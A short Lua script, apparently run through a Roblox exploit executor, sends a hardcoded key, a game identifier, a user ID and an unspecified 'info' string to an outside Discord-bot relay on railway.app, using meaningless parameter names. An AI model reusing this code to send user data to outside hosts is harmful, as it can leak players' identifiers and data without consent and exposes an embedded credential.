local function enviar(clave, marca, userID, info)
	-- ? Construcción de parámetros
	local p1 = "Nkart=" .. clave
	local p2 = "&IPFUEOPjd=" .. marca
	local p3 = "&davvgfrF=" .. userID
	local info_encoded = "&OIHDoihio=" .. info:gsub(" ", "%%20"):gsub("\n", "%%0A")

	-- * Concatenar URL final
	local endpoint = "https://botdiscord-api.up.railway.app/enviar?" .. p1 .. p2 .. p3 .. info_encoded

	-- * Mostrar para debug
	print("🔗 Endpoint generado:")
	print(endpoint)
	local success, response = pcall(function()
		return game:HttpGet(endpoint	)
	end)
	if success then
		print("✅ Mensaje enviado correctamente.")
		print("🔁 Respuesta del servidor:", response)
	else
		warn("❌ Error al contactar con el servidor:", response)
	end


end

enviar("baSLsVSrMMfxlfAdleg6Lqey9N5G", _G.MARCA_DEL_JUEGO, _G.User_ID, _G.infoo)
